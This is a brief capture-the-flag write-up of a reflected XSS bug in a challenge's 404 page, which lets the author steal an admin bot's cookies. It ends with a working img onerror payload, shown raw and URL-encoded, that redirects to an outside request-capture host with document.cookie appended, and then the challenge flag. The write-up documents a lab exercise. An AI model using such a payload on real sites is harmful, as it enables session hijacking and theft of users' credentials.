Looking at the code we can see when a url is submitted the bot will load the current site, set cookies then our url

Due to how the cookies are set they are only valid for the local server so we cant just send the bot to our own page to get tem

Looking about more shows that the error 404 page takes raw user input and puts it on the page so that could be an XSS vector

Playing around with that 404 page give us the following info
* Request has to be URL encoded
* Using script tags causes the app to hang
* Using img with onerror=fetch loads but the background driver doesnt run it

So knowning that fetch doesnt work another possible way of getting output of the cookies is by using `location.replace` which will redirect to a different site

Final solution was to use onerror=location.replace
```
<img src=1 onerror=location.replace("https://en8bp1gmewv3v01.m.pipedream.net?"+document.cookie)>
http://127.0.0.1:1337/%3Cimg%20src%3D1%20onerror%3Dlocation%2Ereplace%28%22https%3A%2F%2Fen8bp1gmewv3v01%2Em%2Epipedream%2Enet%3F%22%2Bdocument%2Ecookie%29%3E
```

CHTB{th1s_1s_my_bug_r3p0rt}
